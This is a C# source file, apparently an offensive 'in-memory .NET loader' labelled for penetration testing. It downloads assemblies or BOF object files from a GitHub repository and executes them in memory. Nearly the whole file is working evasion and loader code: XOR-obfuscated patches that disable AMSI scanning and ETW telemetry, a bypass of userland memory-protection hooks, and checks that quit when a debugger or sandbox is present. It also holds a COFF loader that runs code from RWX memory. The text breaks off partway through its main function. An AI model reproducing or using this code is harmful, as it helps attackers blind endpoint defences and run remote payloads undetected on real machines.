/*
 * RemoteLoader.cs — by hstn
 * In-memory .NET assembly loader from a GitHub repository.
 * Designed for authorized use in internal penetration testing engagements.
 *
 * Compile (.NET 8 SDK):
 *   dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true
 *
 * Usage:
 *   RemoteLoader.exe --repo owner/name/subfolder [--branch b] [--token PAT] [--xor N] [--list] [--exec name] [--args "..."]
 *
 * NOTE: Supports managed .NET assemblies (reflective load) and COFF/BOF x64 object
 *       files (in-process COFF loader with Beacon API stubs). Native PE binaries
 *       (PyInstaller, C++, Go EXEs) are not supported.
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace RemoteLoader
{
    internal static class Program
    {
        // ─── Obfuscation key ─────────────────────────────────────────────────
        private const byte K = 0x41;

        // amsi.dll              XOR K
        private static readonly byte[] _amsiDll      = {0x20,0x2C,0x32,0x28,0x6F,0x25,0x2D,0x2D};
        // AmsiScanBuffer        XOR K
        private static readonly byte[] _amsiFunc     = {0x00,0x2C,0x32,0x28,0x12,0x22,0x20,0x2F,0x03,0x34,0x27,0x27,0x24,0x33};
        // ntdll.dll             XOR K
        private static readonly byte[] _ntdll        = {0x2F,0x35,0x25,0x2D,0x2D,0x6F,0x25,0x2D,0x2D};
        // EtwEventWrite         XOR K
        private static readonly byte[] _etwFunc      = {0x04,0x35,0x36,0x04,0x37,0x24,0x2F,0x35,0x16,0x33,0x28,0x35,0x24};
        // EtwEventWriteFull     XOR K
        private static readonly byte[] _etwFullFunc  = {0x04,0x35,0x36,0x04,0x37,0x24,0x2F,0x35,0x16,0x33,0x28,0x35,0x24,0x07,0x34,0x2D,0x2D};

        // Patch bytes XOR K — never appear as plaintext in .rdata:
        //   AMSI: mov eax,0x80070057 ; ret   → B8 57 00 07 80 C3  XOR K → F9 16 41 46 C1 82
        //   ETW:  ret                         → C3                 XOR K → 82
        private static readonly byte[] _amsiPatch = {0xF9,0x16,0x41,0x46,0xC1,0x82};
        private static readonly byte[] _etwPatch  = {0x82};

        // User-Agent pool — one chosen at random per session
        private static readonly string[] _userAgents =
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        };

        // ─── P/Invoke ─────────────────────────────────────────────────────────
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string n);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr h, string p);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string m);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        // Fallback only — prefer NtProtectVirtualMemory below
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(
            IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        // Lower-level alternative that bypasses VirtualProtect userland hooks
        [DllImport("ntdll.dll")]
        private static extern uint NtProtectVirtualMemory(
            IntPtr processHandle, ref IntPtr baseAddress,
            ref IntPtr regionSize, uint newProtect, out uint oldProtect);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CheckRemoteDebuggerPresent(
            IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

        // SM_CXSCREEN=0, SM_CYSCREEN=1
        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        // ─── String / byte decoder ────────────────────────────────────────────
        private static string Decode(byte[] enc)
        {
            var sb = new StringBuilder(enc.Length);
            foreach (byte b in enc) sb.Append((char)(b ^ K));
            return sb.ToString();
        }

        private static byte[] DecodeBytes(byte[] enc)
        {
            var r = new byte[enc.Length];
            for (int i = 0; i < enc.Length; i++) r[i] = (byte)(enc[i] ^ K);
            return r;
        }

        // ─── Memory cleanup ───────────────────────────────────────────────────
        private static void ClearBytes(byte[] b) { if (b != null) Array.Clear(b, 0, b.Length); }

        // ─── Protected memory write ───────────────────────────────────────────
        // Uses NtProtectVirtualMemory (avoids VirtualProtect hooks); falls back
        // to VirtualProtect if the NT call fails.
        private static bool WriteToMemory(IntPtr addr, byte[] bytes)
        {
            IntPtr baseAddr = addr;
            IntPtr size     = (IntPtr)bytes.Length;
            uint   old;

            uint status = NtProtectVirtualMemory(
                new IntPtr(-1), ref baseAddr, ref size, 0x40, out old);
            bool usedNt = status == 0;

            if (!usedNt && !VirtualProtect(addr, (UIntPtr)bytes.Length, 0x40, out old))
                return false;

            Marshal.Copy(bytes, 0, addr, bytes.Length);

            baseAddr = addr;
            size     = (IntPtr)bytes.Length;
            if (usedNt) NtProtectVirtualMemory(new IntPtr(-1), ref baseAddr, ref size, old, out _);
            else        VirtualProtect(addr, (UIntPtr)bytes.Length, old, out _);

            return true;
        }

        // ─── AMSI bypass ──────────────────────────────────────────────────────
        private static void PatchAmsi()
        {
            try
            {
                IntPtr hAmsi = LoadLibrary(Decode(_amsiDll));
                if (hAmsi == IntPtr.Zero) { Warn("LoadLibrary(amsi) failed"); return; }

                IntPtr pScan = GetProcAddress(hAmsi, Decode(_amsiFunc));
                if (pScan == IntPtr.Zero) { Warn("GetProcAddress(AmsiScanBuffer) failed"); return; }

                byte[] patch = DecodeBytes(_amsiPatch);
                bool ok = WriteToMemory(pScan, patch);
                ClearBytes(patch);

                if (!ok) { Warn("AMSI patch write failed"); return; }
                Ok("AMSI bypass applied");
            }
            catch (Exception ex) { Warn($"AMSI patch error: {ex.Message}"); }
        }

        // ─── ETW bypass ───────────────────────────────────────────────────────
        // Patches EtwEventWrite AND EtwEventWriteFull — both are telemetry sinks
        // that Defender's ETW consumer reads for Assembly.Load events.
        private static void PatchEtw()
        {
            try
            {
                IntPtr hNtdll = GetModuleHandle(Decode(_ntdll));
                if (hNtdll == IntPtr.Zero)
                {
                    hNtdll = LoadLibrary(Decode(_ntdll));
                    if (hNtdll == IntPtr.Zero) { Warn("Could not resolve ntdll"); return; }
                }

                byte[] patch = DecodeBytes(_etwPatch);

                bool anyPatched = false;
                IntPtr pEtw = GetProcAddress(hNtdll, Decode(_etwFunc));
                if (pEtw     != IntPtr.Zero && WriteToMemory(pEtw,     patch)) anyPatched = true;
                IntPtr pEtwFull = GetProcAddress(hNtdll, Decode(_etwFullFunc));
                if (pEtwFull != IntPtr.Zero && WriteToMemory(pEtwFull, patch)) anyPatched = true;

                ClearBytes(patch);
                if (anyPatched) Ok("ETW bypass applied");
                else            Warn("ETW patch: write failed (may still be active)");
            }
            catch (Exception ex) { Warn($"ETW patch error: {ex.Message}"); }
        }

        // ─── Anti-debug ───────────────────────────────────────────────────────
        private static void CheckDebugger()
        {
            // Managed debugger attached
            if (Debugger.IsAttached)
            { Console.Error.WriteLine("[-] Environment check failed (debugger)"); Environment.Exit(0); }

            // Native debugger (PEB.BeingDebugged)
            if (IsDebuggerPresent())
            { Console.Error.WriteLine("[-] Environment check failed (native debugger)"); Environment.Exit(0); }

            // Remote/kernel debugger
            bool remote = false;
            CheckRemoteDebuggerPresent(GetCurrentProcess(), ref remote);
            if (remote)
            { Console.Error.WriteLine("[-] Environment check failed (remote debugger)"); Environment.Exit(0); }

            // Timing — a single-stepped tight loop takes orders of magnitude longer.
            // Threshold scales with core count to avoid false exits under CPU contention.
            long t1 = Stopwatch.GetTimestamp();
            for (int i = 0; i < 1_000_000; i++) { }
            long t2 = Stopwatch.GetTimestamp();
            double ms = (double)(t2 - t1) / Stopwatch.Frequency * 1000.0;
            double timingThreshold = 5000.0 * Math.Max(1, Environment.ProcessorCount / 2);
            if (ms > timingThreshold)
            { Console.Error.WriteLine("[-] Environment check failed (timing)"); Environment.Exit(0); }
        }

        // ─── Sandbox check ────────────────────────────────────────────────────
        private static void CheckSandbox()
        {
            // Uptime — quick-reset sandboxes boot and execute immediately
            long uptimeMs = Environment.TickCount64;
            if (uptimeMs < 180_000)
            { Console.Error.WriteLine("[-] Environment check failed (uptime)"); Environment.Exit(0); }

            // Process count
            try
            {
                if (Process.GetProcesses().Length < 15)
                { Console.Error.WriteLine("[-] Environment check failed (processes)"); Environment.Exit(0); }
            }
            catch { }

            // Disk size — sandbox VMs typically have < 80 GB virtual disks
            try
            {
                string root = Path.GetPathRoot(
                    Environment.GetFolderPath(Environment.SpecialFolder.System)) ?? "C:\\";
                if (new DriveInfo(root).TotalSize < 60L * 1024 * 1024 * 1024)
                { Console.Error.WriteLine("[-] Environment check failed (disk)"); Environment.Exit(0); }
            }
            catch { }

            // Screen resolution — many sandboxes default to 800×600 or 1024×768
            try
            {
                if (GetSystemMetrics(0) < 1024 || GetSystemMetrics(1) < 600)
                { Console.Error.WriteLine("[-] Environment check failed (display)"); Environment.Exit(0); }
            }
            catch { }

            // Username — common in automated analysis environments
            string user     = Environment.UserName.ToLowerInvariant();
            string[] badUsers =
                { "sandbox", "virus", "malware", "sample", "analysis",
                  "analyst", "cuckoo", "honey", "maltest" };
            if (badUsers.Any(u => user.Contains(u)))
            { Console.Error.WriteLine("[-] Environment check failed (user)"); Environment.Exit(0); }
        }

        // ─── XOR payload decoder ─────────────────────────────────────────────
        private static byte[] XorBytes(byte[] data, byte key)
        {
            if (key == 0) return data;
            var result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) result[i] = (byte)(data[i] ^ key);
            return result;
        }

        // ─── GitHub API ───────────────────────────────────────────────────────
        private static async Task<List<(string Name, string DownloadUrl, long Size)>>
            ListBinaries(HttpClient http, string owner, string repo, string folder, string branch)
        {
            string url  = $"https://api.github.com/repos/{owner}/{repo}/contents/{folder}?ref={branch}";
            string json = await (await http.GetAsync(url))
                               .EnsureSuccessStatusCode()
                               .Content.ReadAsStringAsync();

            var results = new List<(string, string, long)>();
            using JsonDocument doc = JsonDocument.Parse(json);

            if (doc.RootElement.GetArrayLength() >= 100)
                Warn("GitHub returned 100 items — folder may have more (API page limit). Use a deeper subfolder path.");

            foreach (JsonElement item in doc.RootElement.EnumerateArray())
            {
                string name = item.GetProperty("name").GetString() ?? "";
                if (!name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) &&
                    !name.EndsWith(".dll", StringComparison.OrdinalIgnoreCase) &&
                    !name.EndsWith(".o",   StringComparison.OrdinalIgnoreCase))
                    continue;

                string dlUrl = item.TryGetProperty("download_url", out var dl)
                               ? dl.GetString() ?? "" : "";
                long   size  = item.TryGetProperty("size", out var sz)
                               ? sz.GetInt64() : 0;

                results.Add((name, dlUrl, size));
            }
            return results;
        }

        // ─── .NET assembly detector ──────────────────────────────────────────
        // Checks PE optional-header data directory entry 14 (COM/CLR descriptor).
        // Non-zero VirtualAddress = managed .NET assembly.
        private static bool IsNetAssembly(byte[] data)
        {
            try
            {
                if (data.Length < 0x40) return false;
                if (data[0] != 0x4D || data[1] != 0x5A) return false;

                int peOff = BitConverter.ToInt32(data, 0x3C);
                if (peOff + 4 >= data.Length) return false;
                if (data[peOff] != 0x50 || data[peOff+1] != 0x45 ||
                    data[peOff+2] != 0    || data[peOff+3] != 0)   return false;

                int optOff = peOff + 4 + 20;
                if (optOff + 2 >= data.Length) return false;

                ushort magic = BitConverter.ToUInt16(data, optOff);
                int clrOff = magic switch
                {
                    0x10B => optOff + 96  + 14 * 8,
                    0x20B => optOff + 112 + 14 * 8,
                    _     => -1
                };
                if (clrOff < 0 || clrOff + 4 >= data.Length) return false;

                return BitConverter.ToUInt32(data, clrOff) != 0;
            }
            catch { return false; }
        }

        // ─── Entry-point discovery ────────────────────────────────────────────
        private static MethodInfo? FindMain(Assembly asm)
        {
            var flags = BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static;

            Type? prog = asm.GetTypes().FirstOrDefault(t => t.Name == "Program");
            if (prog != null)
            {
                MethodInfo? m = prog.GetMethod("Main", flags);
                if (m != null) return m;
            }

            return asm.GetTypes()
                      .Select(t => t.GetMethod("Main", flags))
                      .FirstOrDefault(m => m != null);
        }

        // ─── Argument parser (honours double-quoted tokens) ───────────────────
        private static string[] ParseArgs(string input)
        {
            var tokens  = new List<string>();
            var current = new StringBuilder();
            bool inQ    = false;

            foreach (char c in input)
            {
                if (c == '"')          { inQ = !inQ; continue; }
                if (c == ' ' && !inQ)
                {
                    if (current.Length > 0) { tokens.Add(current.ToString()); current.Clear(); }
                    continue;
                }
                current.Append(c);
            }
            if (current.Length > 0) tokens.Add(current.ToString());
            return tokens.ToArray();
        }

        // ─── BOF argument packer ─────────────────────────────────────────────────
        // Space-separated tokens, each typed: i=<int32>  s=<int16>
        //   z=<ascii-string>  Z=<wide-string>  b=<hex-bytes>
        // Example: --args "z=DOMAIN z=admin i=1"
        private static byte[] PackBofArgs(string input)
        {
            var ms = new MemoryStream();
            var bw = new BinaryWriter(ms);
            foreach (string tok in input.Split(' ', StringSplitOptions.RemoveEmptyEntries))
            {
                int eq = tok.IndexOf('=');
                if (eq < 1) continue;
                string t = tok[..eq], v = tok[(eq + 1)..];
                switch (t)
                {
                    case "i": if (int.TryParse(v,   out int   iv)) bw.Write(iv); break;
                    case "s": if (short.TryParse(v,  out short sv)) bw.Write(sv); break;
                    case "z": { var b = Encoding.ASCII.GetBytes(v + "\0");   bw.Write(b.Length); bw.Write(b); break; }
                    case "Z": { var b = Encoding.Unicode.GetBytes(v + "\0"); bw.Write(b.Length); bw.Write(b); break; }
                    case "b": { var b = Convert.FromHexString(v);            bw.Write(b.Length); bw.Write(b); break; }
                }
            }
            return ms.ToArray();
        }

        // ─── Console helpers ──────────────────────────────────────────────────
        private static void Info(string msg) { Console.ForegroundColor = ConsoleColor.Cyan;   Console.WriteLine($"[*] {msg}"); Console.ResetColor(); }
        private static void Ok(string msg)   { Console.ForegroundColor = ConsoleColor.Green;  Console.WriteLine($"[+] {msg}"); Console.ResetColor(); }
        private static void Warn(string msg) { Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine($"[!] {msg}"); Console.ResetColor(); }
        private static void Err(string msg)  { Console.ForegroundColor = ConsoleColor.Red;    Console.WriteLine($"[-] {msg}"); Console.ResetColor(); }

        private static void PrintBanner()
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(@"
  ____                      _       _                    _
 |  _ \ ___ _ __ ___   ___ | |_ ___| |     ___  __ _  __| | ___ _ __
 | |_) / _ \ '_ ` _ \ / _ \| __/ _ \ |    / _ \/ _` |/ _` |/ _ \ '__|
 |  _ <  __/ | | | | | (_) | ||  __/ |___| (_) | (_| | (_| |  __/ |
 |_| \_\___|_| |_| |_|\___/ \__\___|______\___/ \__,_|\__,_|\___|_|
");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("                         in-memory .NET loader  //  by hstn\n");
            Console.ResetColor();
        }

        private static void PrintHelp()
        {
            Console.WriteLine(@"
Usage:
  RemoteLoader.exe --repo owner/name/subfolder [options]

Options:
  --repo    owner/name/subfolder  GitHub path (required)
  --branch  <branch>              Repo branch              (default: main)
  --token   <PAT>                 GitHub PAT for private repos
  --xor     <byte>                XOR key (0-255) to decode payload before loading
  --list                          Print available binaries and exit (no download)
  --exec    <name>                Select binary by name/substring, skip interactive menu
  --args    <string>              Arguments to pass to the loaded tool (quoted string)
  --help                          Show this message

Supports:
  .NET assemblies  — reflective load via Assembly.Load
  COFF/BOF (.o)    — in-process x64 COFF loader with Beacon API stubs

BOF arg format (--args):  i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>

Examples:
  RemoteLoader.exe --repo YourOrg/tools/bin
  RemoteLoader.exe --repo YourOrg/tools/bin --list
  RemoteLoader.exe --repo YourOrg/tools/bin --exec Rubeus --args ""triage""
  RemoteLoader.exe --repo YourOrg/bofs/bin  --exec whoami
  RemoteLoader.exe --repo YourOrg/bofs/bin  --exec netview --args ""z=DOMAIN""
");
        }

        // ─── BOF (COFF x64 object) loader ────────────────────────────────────────
        // Parses the COFF symbol table, allocates RWX memory per section, applies
        // AMD64 relocations, resolves Beacon API stubs and DLL$Function imports,
        // then calls the 'go' entry point with packed binary arguments.
        private static unsafe class BofLoader
        {
            // ── COFF constants ────────────────────────────────────────────────
            private const ushort MACHINE_AMD64      = 0x8664;
            private const short  SYM_UNDEFINED      = 0;
            private const byte   SYM_CLASS_EXTERNAL = 2;
            private const ushort REL_ADDR64         = 0x0001;
            private const ushort REL_REL32          = 0x0004;
            private const ushort REL_REL32_5        = 0x0009;

            // ── Beacon API delegate types ─────────────────────────────────────
            [StructLayout(LayoutKind.Sequential)]
            private struct DataParser { public IntPtr Orig, Buf; public int Len, Size; }

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate void         FnPrintf(int t, IntPtr fmt);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate void         FnOutput(int t, IntPtr data, int len);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate void         FnDataParse(DataParser* p, byte* buf, int sz);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate int          FnDataInt(DataParser* p);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate short        FnDataShort(DataParser* p);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate int          FnDataLen(DataParser* p);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate byte*        FnDataExtract(DataParser* p, int* sz);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate void         FnFmtAlloc(DataParser* f, int maxsz);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate void         FnFmtReset(DataParser* f);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate void         FnFmtFree(DataParser* f);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate void         FnFmtAppend(DataParser* f, byte* text, int len);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate void         FnFmtPrintf(DataParser* f, IntPtr fmt);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate byte*        FnFmtToString(DataParser* f, int* sz);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate bool         FnIsAdmin();
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] private delegate void         BofEntry(byte* args, int len);

            // ── Beacon API registry ───────────────────────────────────────────
            private static readonly List<Delegate>              _pins = new();
            private static readonly Dictionary<string, IntPtr>  _api  = new();

            static BofLoader()
            {
                Reg("BeaconPrintf",        new FnPrintf(BPrintf));
                Reg("BeaconOutput",        new FnOutput(BOutput));
                Reg("BeaconDataParse",     new FnDataParse(BDataParse));
                Reg("BeaconDataInt",       new FnDataInt(BDataInt));
                Reg("BeaconDataShort",     new FnDataShort(BDataShort));
                Reg("BeaconDataLength",    new FnDataLen(BDataLen));
                Reg("BeaconDataExtract",   new FnDataExtract(BDataExtract));
                Reg("BeaconFormatAlloc",   new FnFmtAlloc(BFmtAlloc));
                Reg("BeaconFormatReset",   new FnFmtReset(BFmtReset));
                Reg("BeaconFormatFree",    new FnFmtFree(BFmtFree));
                Reg("BeaconFormatAppend",  new FnFmtAppend(BFmtAppend));
                Reg("BeaconFormatPrintf",  new FnFmtPrintf(BFmtPrintf));
                Reg("BeaconFormatToString",new FnFmtToString(BFmtToString));
                Reg("BeaconIsAdmin",       new FnIsAdmin(BIsAdmin));
            }

            private static void Reg(string name, Delegate d)
            { _pins.Add(d); _api[name] = Marshal.GetFunctionPointerForDelegate(d); }

            // ── Beacon stubs ──────────────────────────────────────────────────
            private static void   BPrintf(int t, IntPtr fmt)
                => Console.Write(Marshal.PtrToStringAnsi(fmt) ?? "");
            private static void   BOutput(int t, IntPtr data, int len)
            { if (len > 0 && data != IntPtr.Zero) { var b = new byte[len]; Marshal.Copy(data, b, 0, len); Console.Write(Encoding.ASCII.GetString(b)); } }
            private static void   BDataParse(DataParser* p, byte* buf, int sz)
            { p->Orig = p->Buf = (IntPtr)buf; p->Len = p->Size = sz; }
            private static int    BDataInt(DataParser* p)
            { if (p->Len < 4) return 0; int v = *(int*)p->Buf; p->Buf = IntPtr.Add(p->Buf, 4); p->Len -= 4; return v; }
            private static short  BDataShort(DataParser* p)
            { if (p->Len < 2) return 0; short v = *(short*)p->Buf; p->Buf = IntPtr.Add(p->Buf, 2); p->Len -= 2; return v; }
            private static int    BDataLen(DataParser* p) => p->Len;
            private static byte*  BDataExtract(DataParser* p, int* sz)
            {
                if (p->Len < 4) return null;
                int len = *(int*)p->Buf; p->Buf = IntPtr.Add(p->Buf, 4); p->Len -= 4;
                if (len > p->Len) return null;
                byte* data = (byte*)p->Buf;
                if (sz != null) *sz = len;
                p->Buf = IntPtr.Add(p->Buf, len); p->Len -= len;
                return data;
            }
            private static void   BFmtAlloc(DataParser* f, int maxsz)
            { f->Orig = f->Buf = Marshal.AllocHGlobal(maxsz); f->Len = 0; f->Size = maxsz; }
            private static void   BFmtReset(DataParser* f)  { f->Buf = f->Orig; f->Len = 0; }
            private static void   BFmtFree(DataParser* f)
            { if (f->Orig != IntPtr.Zero) Marshal.FreeHGlobal(f->Orig); f->Orig = f->Buf = IntPtr.Zero; f->Len = f->Size = 0; }
            private static void   BFmtAppend(DataParser* f, byte* text, int len)
            { if (f->Len + len > f->Size) return; Buffer.MemoryCopy(text, (void*)f->Buf, f->Size - f->Len, len); f->Buf = IntPtr.Add(f->Buf, len); f->Len += len; }
            private static void   BFmtPrintf(DataParser* f, IntPtr fmt)
            { string s = Marshal.PtrToStringAnsi(fmt) ?? ""; var b = Encoding.ASCII.GetBytes(s); fixed (byte* pb = b) BFmtAppend(f, pb, b.Length); }
            private static byte*  BFmtToString(DataParser* f, int* sz)
            { if (sz != null) *sz = f->Len; return (byte*)f->Orig; }
            private static bool   BIsAdmin() => Environment.IsPrivilegedProcess;

            // ── Helpers ───────────────────────────────────────────────────────
            private static string SymName(byte[] coff, int symOff, int strTabOff)
            {
                if (coff[symOff] == 0 && coff[symOff+1] == 0 && coff[symOff+2] == 0 && coff[symOff+3] == 0)
                {
                    int off = BitConverter.ToInt32(coff, symOff + 4);
                    int end = strTabOff + off;
                    while (end < coff.Length && coff[end] != 0) end++;
                    return Encoding.ASCII.GetString(coff, strTabOff + off, end - (strTabOff + off));
                }
                int len = 0;
                while (len < 8 && coff[symOff + len] != 0) len++;
                return Encoding.ASCII.GetString(coff, symOff, len);
            }

            private static IntPtr ResolveExternal(string name)
            {
                if (_api.TryGetValue(name, out var p)) return p;
                int dollar = name.IndexOf('$');
                if (dollar > 0)
                {
                    string dll  = name[..dollar] + ".dll";
                    string func = name[(dollar + 1)..];
                    IntPtr hMod = GetModuleHandle(dll);
                    if (hMod == IntPtr.Zero) hMod = LoadLibrary(dll);
                    if (hMod != IntPtr.Zero) { var addr = GetProcAddress(hMod, func); if (addr != IntPtr.Zero) return addr; }
                }
                return IntPtr.Zero;
            }

            private static void ApplyReloc(IntPtr site, IntPtr sym, ushort type)
            {
                if (type == REL_ADDR64)
                { long* p = (long*)site; *p = sym.ToInt64() + *p; return; }
                if (type >= REL_REL32 && type <= REL_REL32_5)
                { int n = type - REL_REL32; int* p = (int*)site; *p = (int)(sym.ToInt64() - (site.ToInt64() + 4 + n)); }
                // REL_ADDR32NB (0x0003) is used for debug info — safe to skip
            }

            // ── Public surface ────────────────────────────────────────────────
            public static bool IsBof(byte[] data)
            {
                if (data.Length < 20) return false;
                if (data[0] == 0x4D && data[1] == 0x5A) return false; // MZ = PE
                return BitConverter.ToUInt16(data, 0) == MACHINE_AMD64
                    && BitConverter.ToUInt16(data, 16) == 0; // SizeOfOptionalHeader==0 → object file
            }

            public static void Execute(byte[] coff, byte[] args)
            {
                ushort nSec      = BitConverter.ToUInt16(coff, 2);
                int    symTabOff = BitConverter.ToInt32(coff,  8);
                int    nSym      = BitConverter.ToInt32(coff,  12);
                int    strTabOff = symTabOff + nSym * 18;

                // Allocate RWX memory for each section and copy raw data
                IntPtr[] secMem = new IntPtr[nSec];
                int[]    secSz  = new int[nSec];
                const int SH = 20; // section headers start after 20-byte file header
                for (int s = 0; s < nSec; s++)
                {
                    int rawSz  = BitConverter.ToInt32(coff, SH + s * 40 + 16);
                    int rawPtr = BitConverter.ToInt32(coff, SH + s * 40 + 20);
                    secSz[s] = rawSz;
                    if (rawSz <= 0) continue;
                    secMem[s] = VirtualAlloc(IntPtr.Zero, (UIntPtr)rawSz, 0x3000, 0x40 /* RWX */);
                    if (secMem[s] == IntPtr.Zero) throw new InvalidOperationException($"VirtualAlloc failed (section {s})");
                    Marshal.Copy(coff, rawPtr, secMem[s], rawSz);
                }

                // Resolve all symbols
                IntPtr[] symAddr = new IntPtr[nSym];
                for (int i = 0; i < nSym; )
                {
                    int   off   = symTabOff + i * 18;
                    short secN  = BitConverter.ToInt16(coff,  off + 12);
                    uint  val   = BitConverter.ToUInt32(coff, off + 8);
                    byte  cls   = coff[off + 16];
                    byte  aux   = coff[off + 17];

                    if (secN == SYM_UNDEFINED && cls == SYM_CLASS_EXTERNAL)
                    {
                        string name = SymName(coff, off, strTabOff);
                        symAddr[i] = ResolveExternal(name);
                        if (symAddr[i] == IntPtr.Zero)
                            Warn($"BOF: unresolved symbol '{name}'");
                    }
                    else if (secN > 0 && secN <= nSec && secMem[secN - 1] != IntPtr.Zero)
                        symAddr[i] = secMem[secN - 1] + (int)val;

                    i += 1 + aux;
                }

                // Apply relocations
                for (int s = 0; s < nSec; s++)
                {
                    if (secMem[s] == IntPtr.Zero) continue;
                    int nReloc  = BitConverter.ToUInt16(coff, SH + s * 40 + 32);
                    int relocOff = BitConverter.ToInt32(coff, SH + s * 40 + 24);
                    for (int r = 0; r < nReloc; r++)
                    {
                        int    rOff   = relocOff + r * 10;
                        uint   va     = BitConverter.ToUInt32(coff, rOff);
                        int    symIdx = (int)BitConverter.ToUInt32(coff, rOff + 4);
                        ushort rType  = BitConverter.ToUInt16(coff, rOff + 8);
                        ApplyReloc(secMem[s] + (int)va, symAddr[symIdx], rType);
                    }
                }

                // Find 'go' entry point
                IntPtr goAddr = IntPtr.Zero;
                for (int i = 0; i < nSym && goAddr == IntPtr.Zero; )
                {
                    int   off  = symTabOff + i * 18;
                    short secN = BitConverter.ToInt16(coff,  off + 12);
                    uint  val  = BitConverter.ToUInt32(coff, off + 8);
                    byte  aux  = coff[off + 17];
                    if (SymName(coff, off, strTabOff) == "go" && secN > 0 && secN <= nSec && secMem[secN - 1] != IntPtr.Zero)
                        goAddr = secMem[secN - 1] + (int)val;
                    i += 1 + aux;
                }
                if (goAddr == IntPtr.Zero)
                    throw new InvalidOperationException("BOF entry point 'go' not found in symbol table");

                // Execute
                var go = Marshal.GetDelegateForFunctionPointer<BofEntry>(goAddr);
                if (args.Length > 0)
                    fixed (byte* pArgs = args) go(pArgs, args.Length);
                else
                    go(null, 0);

                // Free section memory
                foreach (IntPtr m in secMem)
                    if (m != IntPtr.Zero) VirtualFree(m, UIntPtr.Zero, 0x8000 /* MEM_RELEASE */);
            }
        }

        // ─── Entry point ──────────────────────────────────────────────────────
        private static async Task Main(string[] cliArgs)
        {
            PrintBanner();

            string  repoPath = "";
            string  token    = "";
            string  branch   = "main";
            byte    xorKey   = 0;
            string? execName = null;   // --exec: skip interactive menu
            string? execArgs = null;   // --args: skip interactive args prompt
            bool    listOnly = false;  // --list: print menu and exit

            for (int i = 0; i < cliArgs.Length; i++)
            {
                switch (cliArgs[i])
                {
                    case "--repo"   when i + 1 < cliArgs.Length: repoPath = cliArgs[++i]; break;
                    case "--token"  when i + 1 < cliArgs.Length: token    = cliArgs[++i]; break;
                    case "--branch" when i + 1 < cliArgs.Length: branch   = cliArgs[++i]; break;
                    case "--xor"   when i + 1 < cliArgs.Length:
                        if (byte.TryParse(cliArgs[++i], out byte k)) xorKey = k;
                        else Warn($"Invalid --xor value '{cliArgs[i]}', defaulting to 0");
                        break;
                    case "--exec" when i + 1 < cliArgs.Length: execName = cliArgs[++i]; break;
                    case "--args" when i + 1 < cliArgs.Length: execArgs = cliArgs[++i]; break;
                    case "--list": listOnly = true; break;
                    case "--help": case "-h": PrintHelp(); return;
                    default: Warn($"Unknown argument: {cliArgs[i]}"); break;
                }
            }

            if (string.IsNullOrEmpty(repoPath))
            {
                Err("--repo is required.  Example: --repo owner/name/subfolder");
                PrintHelp();
                return;
            }

            // ── Evasion ───────────────────────────────────────────────────────
            PatchAmsi();
            PatchEtw();
            CheckDebugger();
            CheckSandbox();

            // ── System proxy ──────────────────────────────────────────────────
            var handler = new HttpClientHandler { UseProxy = true, Proxy = WebRequest.GetSystemWebProxy() };
            try { handler.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials; }
